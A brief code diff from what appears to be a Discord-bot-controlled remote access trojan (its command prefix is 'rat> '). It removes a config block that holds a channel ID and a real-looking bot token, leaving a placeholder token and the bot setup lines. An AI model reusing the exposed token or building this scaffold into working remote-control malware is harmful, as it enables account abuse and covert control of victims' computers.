@@ -8,10 +8,6 @@ notification_channel = 11011100111010101101100011011
 bot_token = "nullcode.yadayada.isthebest"
 bot_prefix = "rat> "
 
-notification_channel = 846008857745686549
-bot_token = "ODM4NjI1MTY0OTQ1Nzg0ODQy.YI90jA.KkkStDWROoCtXjQaz1xoE-x_yYgs"
-bot_prefix = "rat> "
-
 client = commands.Bot(command_prefix=bot_prefix)
 client.remove_command("help")
 ogdir = os.getcwd(); a = 1
